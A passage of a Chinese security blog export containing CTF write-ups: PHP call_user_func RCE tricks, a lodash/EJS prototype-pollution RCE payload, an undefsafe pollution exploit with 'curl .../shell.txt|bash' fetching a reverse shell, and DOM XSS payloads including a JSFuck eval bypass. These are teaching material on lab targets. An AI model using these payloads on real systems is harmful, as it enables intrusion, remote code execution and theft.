方法提供了一种方便的方式将不同类型的可调用（函数、类方法、可调用对象）转换为闭包对象，从而可以用统一的方式来调用这些可调用。这个特性在编写更灵活的代码时非常有用，比如在函数式编程中或需要将不同的回调传递给函数时。\n\n\n\n# web3\n\n\n\n```php\n<?php\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\n    unset($parameters['action']);\n}\ncall_user_func($action, $parameters);\nif(count(glob(__DIR__.'/*'))>3){\n    readfile('flag.txt');\n}\n?>\n```\n\n分析\n\n这里利用的是readfile函数来读flag，但是这里判断了当前文件夹里是否有3个以上的文件，\n\n这里我们知道，他原本的环境下应该只有两个文件，所以我们得想办法创建两个文件，\n\n但是这里测试发现，常规的创建文件的方法都不适用，因为我们这里传入的第二个参数是一个数组\n\n\n\n这里题目给的思路很独特，用用session，来创建文件\n\n我们知道当用户与服务器开启对话的时候，客户端会生成ck，服务端会生成session文件，那么我们是不是可以尝试这个思路呢？\n\n\n\n![image-20250722222738373](RCE-5道挑战题/image-20250722222738373.png)\n\n查询官方文档发现`session_start`正好他可以通过`session.save_path` ；来指定路径，然后会创建session文件\n\n![image-20250722223034185](RCE-5道挑战题/image-20250722223034185.png)\n\n而且这个参数是用户可控的\n\n在写入文件之前，首先通过报错来定位当前物理路径，报错的方法有很多，大体是通过引入一个函数并传递“不合法”的参数。\n\n那么我们很容易想到payload\n\n```\n?action=session_start&save_path=/var/www\n```\n\n测试发现无法写入/var/www/html\n\n但是将目录改为/tmp,却成功写入了\n\n\n\n![image-20250722223622812](RCE-5道挑战题/image-20250722223622812.png)\n\n这里问大模型说\n\n![image-20250722224048867](RCE-5道挑战题/image-20250722224048867.png)\n\n当时的题目环境可能设置了这个吧\n\n另外，其实也考虑过利用 upload_progress 来控制写入文件的内容，再配合其他include 来加载shell。这里有几点需要说明：\n\n1. 需要开启 session.auto_start ，这个配置是无法动态开启的，需要环境默认开启。\n2. 写入文件以后，文件是以sess_ 开头并且文件名只能由这些字符构成：(0-9, a-z, A-Z, \"-\", \",\") 。这也导致了不能直接写.php文件。\n\n# web4\n\n```php\n<?php\nClass A{\n    static function f(){\n        system($_POST['a']);\n    }\n}\n\n\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\nunset($parameters['action']);\n}\n\ncall_user_func($action, $parameters);\n\n```\n\n本题是为了演示加载静态方法（无参类型或参数均含有默认值）\n\n这道题就很简单了\n\n先调用A 这个class，然后在调用f这个函数，最后post['a']传入执行的代码\n\npayload\n\n```\n?action=call_user_func&0=A&1=f\npost: a=ls\n```\n\n![image-20250722224632555](RCE-5道挑战题/image-20250722224632555.png)\n\n# web5\n\n\n\n```\n<?php\nClass A{\n    static function f(string $a){\n        system($a);\n    }\n}\n\n\n$action = $_GET['action'];\n$parameters = $_GET;\nif (isset($parameters['action'])) {\nunset($parameters['action']);\n}\n\ncall_user_func($action, $parameters);\necho $_POST['a'];\n\n```\n\n这道题与上一道题的改变就是我们无法直接利用post['a'] 传入我们的执行代码了\n\npayload\n\n```\n?action=ob_start&0=A&1=f\npost: a=touch /tmp/aaa\n```\n\n这里他利用了`ob_start` 这个函数，我们去官方文档查查看\n\n![image-20250722230857336](RCE-5道挑战题/image-20250722230857336.png)\n\n他说他能够打开输出的缓冲区\n\n![image-20250722231539904](RCE-5道挑战题/image-20250722231539904.png)\n\n而且他说当冲刷（发送）、清理输出缓冲区或在脚本末尾冲刷输出缓冲区时，将调用 `callback`。\n\n也就是说我们打开缓冲区后，$a 会自动的读取缓冲区的内容\n\n所以我们可以在post['a'] ，实现任意的rce\n\n比如\n\n![image-20250722233100827](RCE-5道挑战题/image-20250722233100827.png)\n\n\n\n![image-20250722233104960](RCE-5道挑战题/image-20250722233104960.png)\n\n![image-20250722233111387](RCE-5道挑战题/image-20250722233111387.png)\n\n这里的任意命令都可以执行，我们尝试执行一下 whoami\n\n![image-20250722233144087](RCE-5道挑战题/image-20250722233144087.png)\n\n但却发现没有回显，问问大模型\n\n![image-20250722233211207](RCE-5道挑战题/image-20250722233211207.png)\n\n\n\n我们修改一下源代码，加入return\n\n再次测试\n\n![image-20250722233250238](RCE-5道挑战题/image-20250722233250238.png)\n\n成功回显，可能问题就是这里，这里我们可以发现，当我们打开缓冲区后，$a 会从缓冲区来取值，\n\n从而实现rce\n\n\n\n# 总结\n\n\n\n在这样的代码环境下，我们能做的有这样几点：\n\n1. 可通过var_dump引入反射型xss(`?action=var_dump&1=<script>alert(1)</script>`)；\n\n2. 可通过引入报错来获取物理路径；\n\n3. 可通过session_start 写入文件，写入文件路径可自定义，文件内容是否可控要看服务器配置；\n\n4. 加载php内置函数或原生类/已有类的静态方法，函数参数类型需为：Array、Mixed、callable。 其中callable类型可再次加载 ，并以数组形式传入类名和静态方法名称。 如果函数有多个参数，其他参数需要有默认参数，无默认参数的那个参数需满足以上参数类型条件。若函数参数均有默认参数,首个参数类型需满足以上参数类型条件。\n\n5. 当有echo 配合时，可通过ob_start 加载原生类/已有类的静态函数，函数参数支持string类型。\n\n","tags":["RCE"],"categories":["web安全"]},{"title":"[GYCTF2020]Ez_Express","url":"/2025/07/19/GYCTF2020-Ez-Express/","content":"\n打开网站发现就这么一个页面\n\n<!--more-->\n\n![image-20250719003333304](GYCTF2020-Ez-Express/image-20250719003333304.png)\n\nf12 也没能找到什么有用的东西\n\n提示说用admin登录\n\n尝试\n\n![image-20250719003436443](GYCTF2020-Ez-Express/image-20250719003436443.png)\n\n被拒绝\n\n我们在尝试注册\n\nadmin不能注册，随便换了个注册进入页面\n\n![image-20250719003535164](GYCTF2020-Ez-Express/image-20250719003535164.png)\n\n在f12看一下\n\n![image-20250719003623393](GYCTF2020-Ez-Express/image-20250719003623393.png)\n\n发现藏了一个压缩包\n\n访问一下\n\n![image-20250719003702693](GYCTF2020-Ez-Express/image-20250719003702693.png)\n\n拿到源码解压\n\n![image-20250719003822768](GYCTF2020-Ez-Express/image-20250719003822768.png)\n\n这里发现有lodash 和ejs 引擎 ，看lodash这个版本 有原型链污染漏洞，ejs引擎也可以进行rce\n\n主要源码\n\n```\nvar express = require('express');\nvar router = express.Router();\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n\n  return undefined\n}\n\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n\nrouter.get('/login', function (req, res) {\n  res.render('login');\n});\n\n\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n\n```\n\n一眼就看到了merge\n\n```\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n\nclone 方法调用了merge 我们往下看看有什么调用了clone\n\n![image-20250719004128236](GYCTF2020-Ez-Express/image-20250719004128236.png)\n\n只有这一个地方\n\n所以我们污染的地方大概率就是这里了\n\n```\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\n```\n\n他要先判断\n\nsession的user是否是\"ADMIN\"，但是这里我们是不知道ADMIN的密码的，\n\n```\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\n```\n\n从他的登录函数里面发现\n\n`'user':req.body.userid.toUpperCase(),` 这里他调用了转大写，那么我们就可以用特殊字符转为大写是ADMIN其中一个字符是否就可以绕过了呢？\n\n问问大模型写了个脚本\n\n```\n# -*- coding: utf-8 -*-\nimport unicodedata\n\ndef is_uppercase_letter(s):\n    return len(s) == 1 and 'A' <= s <= 'Z'\n\ndef find_special_chars_to_uppercase_letters():\n    results = []\n\n    for codepoint in range(0x110000):  # Unicode 全范围\n        char = chr(codepoint)\n        upper_char = char.upper()\n\n        if is_uppercase_letter(upper_char) and not ('A' <= char <= 'Z' or 'a' <= char <= 'z'):\n            try:\n                name = unicodedata.name(char)\n            except ValueError:\n                name = \"UNKNOWN\"\n            results.append((char, upper_char, f\"U+{codepoint:04X}\", name))\n\n    return results\n\n# 执行并输出结果\nresults = find_special_chars_to_uppercase_letters()\nfor original, uppered, code, name in results:\n    print(f\"{code} '{original}' -> '{uppered}' ({name})\")\n\nprint(f\"\\n总共有 {len(results)} 个字符在 upper() 后变成 A-Z\")\n\n```\n\n运行后输出\n\n![image-20250719004826401](GYCTF2020-Ez-Express/image-20250719004826401.png)\n\n```\nU+0131 'ı' -> 'I' (LATIN SMALL LETTER DOTLESS I)\nU+017F 'ſ' -> 'S' (LATIN SMALL LETTER LONG S)\n```\n\n所以我们成功找到了`ı`这个可以转为大写的I，试试能不能绕过\n\n![image-20250719004941959](GYCTF2020-Ez-Express/image-20250719004941959.png)\n\n成功进入了ADMIN 页面\n\n接下来，我们继续分析，如何进行污染，执行rce\n\n![image-20250719005229674](GYCTF2020-Ez-Express/image-20250719005229674.png)\n\n这里题目给了提示 `outputFunctionName` 未定义 而且ejs 引擎的函数执行也会 调用 `outputFunctionName`\n\n```\n\"__proto__\":{\"outputFunctionName\":\"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')\n```\n\n这里的写法基本是固定的，因为ejs底层的执行命令就可以这么写\n\n接下来抓包 发送payload\n\n\n\n![image-20250719010059267](GYCTF2020-Ez-Express/image-20250719010059267.png)\n\n这里我们需要将这两个地方改为json格式\n\npayload\n\n```\n{\"lua\":\"aaaa\",\"__proto__\":{\"outputFunctionName\":\"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//\"},\"Submit\":\"\"}\n```\n\n发送，然后访问/info调用执行\n\n![image-20250719010547148](GYCTF2020-Ez-Express/image-20250719010547148.png)\n\n成功拿到flag\n\n","tags":["原型链污染"],"categories":["web安全"]},{"title":"[网鼎杯 2020 青龙组]notes","url":"/2025/07/18/网鼎杯-2020-青龙组-notes/","content":"\n题目给了源码\n\n因为靶场我们不好反弹shell\n\n<!--more-->\n\n所以我们部署到本地\n\n\n\n```\nvar express = require('express');\nvar path = require('path');\nconst undefsafe = require('undefsafe');\nconst { exec } = require('child_process');\n\nvar app = express();\nclass Notes {\n    constructor() {\n        this.owner = \"whoknows\";\n        this.num = 0;\n        this.note_list = {};    \n    }\n\n    write_note(author, raw_note) {\n        this.note_list[(this.num++).toString()] = {\"author\": author,\"raw_note\":raw_note};\n    }\n\n    get_note(id) {\n        var r = {}\n        undefsafe(r, id, undefsafe(this.note_list, id));\n        return r;\n    }\n\n    edit_note(id, author, raw) {\n        undefsafe(this.note_list, id + '.author', author);\n        undefsafe(this.note_list, id + '.raw_note', raw);\n    }\n\n    get_all_notes() {\n        return this.note_list;\n    }\n\n    remove_note(id) {\n        delete this.note_list[id];\n    }\n}\n\nvar notes = new Notes();\nnotes.write_note(\"nobody\", \"this is nobody's first note\");\n\n\napp.set('views', path.join(__dirname, 'views'));\napp.set('view engine', 'pug');   \n\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\napp.use(express.static(path.join(__dirname, 'public')));\n\n\napp.get('/', function(req, res, next) {\n  res.render('index', { title: 'Notebook' });\n});\n\napp.route('/add_note')\n    .get(function(req, res) {\n        res.render('mess', {message: 'please use POST to add a note'});\n    })\n    .post(function(req, res) {\n        let author = req.body.author;\n        let raw = req.body.raw;\n        if (author && raw) {\n            notes.write_note(author, raw);\n            res.render('mess', {message: \"add note sucess\"});\n        } else {\n            res.render('mess', {message: \"did not add note\"});\n        }\n    })\n\napp.route('/edit_note')    \n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to edit a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        let author = req.body.author;\n        let enote = req.body.raw;\n        if (id && author && enote) {\n            notes.edit_note(id, author, enote);\n            res.render('mess', {message: \"edit note sucess\"});\n        } else {\n            res.render('mess', {message: \"edit note failed\"});\n        }\n    })\n\napp.route('/delete_note')\n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to delete a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        if (id) {\n            notes.remove_note(id);\n            res.render('mess', {message: \"delete done\"});\n        } else {\n            res.render('mess', {message: \"delete failed\"});\n        }\n    })\n\napp.route('/notes')\n    .get(function(req, res) {\n        let q = req.query.q;\n        let a_note;\n        if (typeof(q) === \"undefined\") {\n            a_note = notes.get_all_notes();\n        } else {\n            a_note = notes.get_note(q);\n        }\n        res.render('note', {list: a_note});\n    })\n\napp.route('/status')    \n    .get(function(req, res) {\n        let commands = {\n            \"script-1\": \"uptime\",\n            \"script-2\": \"free -m\"\n        };\n        for (let index in commands) {\n            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {\n                if (err) {\n                    return;\n                }\n                console.log(`stdout: ${stdout}`);   \n            });\n        }\n        res.send('OK');\n        res.end();\n    })\n\n\napp.use(function(req, res, next) {\n  res.status(404).send('Sorry cant find that!');\n});\n\n\napp.use(function(err, req, res, next) {\n  console.error(err.stack);\n  res.status(500).send('Something broke!');\n});\n\n\nconst port = 8080;\napp.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))\n```\n\n\n\n### 环境部署\n\n首先我们打开ubantu\n\n```\nmkdir /root/wdb2020\nvim app.js\n//复制源码粘贴进去\nnpm install undefsafe@2.0.2 --save  //因为我们这里漏洞生效的版本在 <=2.0.3\nnpm install express pug\n\nmkdir /root/wdb2020/views\ntouch index.pug  mess.pug  note.pug  //可以为空保证我们的js文件能正常运行即可\n\n//最后运行app.js\n\nnode app.js\n```\n\n\n\n\n\n### 代码分析及解决\n\n我们注意到其使用了 undefsafe 模块，那么如果我们可以操纵其第 2、3 个参数，即可进行原型链污染，则可使目标网站存在风险。故此，我们首先要寻找 undefsafe 的调用点：\n\n```\nget_note(id) {\n    var r = {}\n    undefsafe(r, id, undefsafe(this.note_list, id));\n    return r;\n}\n\nedit_note(id, author, raw) {\n    undefsafe(this.note_list, id + '.author', author); \n    undefsafe(this.note_list, id + '.raw_note', raw);\n}\n```\n\n发现在查看 note 和编辑 note 时会调用 undefsafe，那我们首先查看 get_note 方法会被哪个路由调用：\n\n```\napp.route('/notes')\n    .get(function(req, res) {\n        let q = req.query.q;\n        let a_note;\n        if (typeof(q) === \"undefined\") {\n            a_note = notes.get_all_notes();\n        } else {\n            a_note = notes.get_note(q);\n        }\n        res.render('note', {list: a_note});\n    })\n```\n\n发现此时虽然 q 参数可控，但是也只有 q 参数可控，也就是说我们只能控制 undefsave 函数的第二个参数，而 undefsave 函数的第三个参数我们控制不了。\n\n而对于 edit_note 方法，我们发现 edit_note 路由中会调用 edit_note 方法：\n\n```\napp.route('/edit_note')\n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to edit a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        let author = req.body.author;\n        let enote = req.body.raw;\n        if (id && author && enote) {\n            notes.edit_note(id, author, enote);\n            res.render('mess', {message: \"edit note sucess\"});\n        } else {\n            res.render('mess', {message: \"edit note failed\"});\n        }\n    })\n```\n\n此时 id、author 和 raw 均为我们的可控值，那么我们则可以操纵原型链进行污染：\n\n    edit_note(id, author, raw) {\n        undefsafe(this.note_list, id + '.author', author);\n        undefsafe(this.note_list, id + '.raw_note', raw);\n    }\n\n这里 1或者2 都可以利用\n\n那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现 /status 路由有命令执行的操作：\n\n```\napp.route('/status')    // 漏洞点，只要将字典commands给污染了，就能执行我们的任意命令\n    .get(function(req, res) {\n        let commands = {\n            \"script-1\": \"uptime\",\n            \"script-2\": \"free -m\"\n        };\n        for (let index in commands) {\n            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {\n                if (err) {\n                    return;\n                }\n                console.log(`stdout: ${stdout}`);    // 将命令执行结果输出\n            });\n        }\n        res.send('OK');\n        res.end();\n    })\n```\n\n\n\n这里他用的 for ... in ... 我们查找官方文档可以知道\n\n![image-20250718175443628](网鼎杯-2020-青龙组-notes/image-20250718175443628.png)\n\n循环迭代可枚举的非符号属性，包括他所继承的object\n\n我们可以做个测试\n\n![image-20250718175955349](网鼎杯-2020-青龙组-notes/image-20250718175955349.png)\n\n通过测试也完全印证了我们的想法\n\n那么这里我们就可以考虑怎么构造payload\n\n```\nid=__proto__&author=curl 192.168.197.130/shell.txt|bash&raw=aaaa;\n```\n\n运用反弹shell\n\n我们还需要在攻击机，运行nginx服务，然后vim shell.txt ，让目标主机来curl 触发反弹shell\n\n![image-20250718180320499](网鼎杯-2020-青龙组-notes/image-20250718180320499.png)\n\n\n\n接下来去抓包测试，这里我用hackbar直接进行post提交\n\n![image-20250718180436299](网鼎杯-2020-青龙组-notes/image-20250718180436299.png)\n\n然后在访问/status 路由触发命令执行\n\n偶对，这里我们需要在攻击机上监听2333端口\n\n![image-20250718180606268](网鼎杯-2020-青龙组-notes/image-20250718180606268.png)\n\n访问/status\n\n![image-20250718180634856](网鼎杯-2020-青龙组-notes/image-20250718180634856.png)\n\n\n\n成功触发反弹shell\n","tags":["原型链污染"],"categories":["web安全"]},{"title":"XSS-DOM破坏","url":"/2025/07/14/XSS-DOM破坏/","content":"\nDOM破坏基础\n\n<!--more-->\n\n##### 第一关\n\n\n\n![image-20250714163349243](XSS-DOM破坏/image-20250714163349243.png)\n\n源码\n\n```\n<!-- Challenge -->\n<h2 id=\"spaghet\"></h2>\n<script>\n    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || \"Somebody\") + \" Toucha Ma Spaghet!\"\n</script>\n```\n\n分析\n\nget传值somebody 直接给h2添加属性\n\npayload\n\n```\n?somebody=<img src=\"1\" onerror=\"alert(1337)\">\n```\n\n![image-20250714164602338](XSS-DOM破坏/image-20250714164602338.png)\n\n\n\n##### 第二关\n\n![image-20250714164629867](XSS-DOM破坏/image-20250714164629867.png)\n\n源码\n\n```\n<h2 id=\"maname\"></h2>\n<script>\n    let jeff = (new URL(location).searchParams.get('jeff') || \"JEFFF\")\n    let ma = \"\"\n    eval(`ma = \"Ma name ${jeff}\"`)\n    setTimeout(_ => {\n        maname.innerText = ma\n    }, 1000)\n</script>\n```\n\n分析\n\n一样的get获取jeff的值  利用点在eval\n\n我们可以闭合`\"` 然后直接`alert(1337)`\n\npayload\n\n```\n?jeff=\";alert(1)//\n```\n\n![image-20250714165226881](XSS-DOM破坏/image-20250714165226881.png)\n\n##### 第三关\n\n![image-20250714165258839](XSS-DOM破坏/image-20250714165258839.png)\n\n源码\n\n```\n<!-- Challenge -->\n<div id=\"uganda\"></div>\n<script>\n    let wey = (new URL(location).searchParams.get('wey') || \"do you know da wey?\");\n    wey = wey.replace(/[<>]/g, '')\n    uganda.innerHTML = `<input type=\"text\" placeholder=\"${wey}\" class=\"form-control\">`\n</script>\n```\n\n分析\n\n一样通过wey get传递值\n\n但是经过了`wey.replace(/[<>]/g, '')` 过滤，过滤了 `<>` \n\n然后通过`innerHTML`给`uganda` 赋值\n\n因为不能通过 用户交互，所以我们不用on的点击时间\n\n但是有一个自动获取焦点的函数 `onfocus` 并且这个函数有一个自动获取焦点的参数 `autofocus` \n\n即可实现自动弹窗\n\npayload\n\n```\n?wey=\"autofocus%20onfocus=alert(1337)\"\n```\n\n![image-20250714170139855](XSS-DOM破坏/image-20250714170139855.png)\n\n##### 第四关\n\n![image-20250714170220070](XSS-DOM破坏/image-20250714170220070.png)\n\n源码\n\n```\n<!-- Challenge -->\n<form id=\"ricardo\" method=\"GET\">\n    <input name=\"milos\" type=\"text\" class=\"form-control\" placeholder=\"True\" value=\"True\">\n</form>\n<script>\n    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')\n    setTimeout(_ => {\n        ricardo.submit()\n    }, 2000)\n</script>\n```\n\n分析\n\n通过`ricardo` get传参 然后设置定时器 2秒自动提交给form表单\n\n然后form 表单中有method 属性接收的GET  表单属性可以通过`javascript:` 伪协议解析alert\n\npayload\n\n```\n?ricardo=javascript:alert(1337)\n```\n\n![image-20250714171021502](XSS-DOM破坏/image-20250714171021502.png)\n\n\n\n##### 第五关\n\n![image-20250714171502986](XSS-DOM破坏/image-20250714171502986.png)\n\n源码\n\n```\n<h2 id=\"will\"></h2>\n<script>\n    smith = (new URL(location).searchParams.get('markassbrownlee') || \"Ah That's Hawt\")\n    smith = smith.replace(/[\\(\\`\\)\\\\]/g, '')\n    will.innerHTML = smith\n</script>\n```\n\n分析\n\nget传承 `markassbrownlee` 获取值 ， `will.innerHTML = smith` 添加属性，但是\n\n`smith.replace(/[\\(\\\\)\\\\]/g, '')` 过滤了`()\\`\n\n所以alert的这个括号 被过滤了，我们考虑通过实体编码绕过\n\n因为我们在`url`地址栏传入的参数 先会经过浏览器进行`decode` 然后进入 `js` 接收到值后，通过了过滤函数，在进入`html` ，实体编码被解析为`()` \n\npayload\n\n```\n?markassbrownlee=<img src=\"1\" onerror=\"alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B\">\n```\n\n![image-20250714172528731](XSS-DOM破坏/image-20250714172528731.png)\n\n##### 第六关\n\n![image-20250714172546097](XSS-DOM破坏/image-20250714172546097.png)\n\n源码\n\n```\n/* Challenge */\nballs = (new URL(location).searchParams.get('balls') || \"Ninja has Ligma\")\nballs = balls.replace(/[A-Za-z0-9]/g, '')\neval(balls)\n```\n\n分析\n\n过滤掉了大小写字母，还有数字\n\n看见了`eval`函数 利用点就在这\n\n现在就是考虑怎么绕过这个正则\n\n想到了jsfuck\n\n![image-20250714173009491](XSS-DOM破坏/image-20250714173009491.png)\n\n直接通过\n\n这个编码，然后进行一下`urlencode`编码 \n\npayload\n\n```\n?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%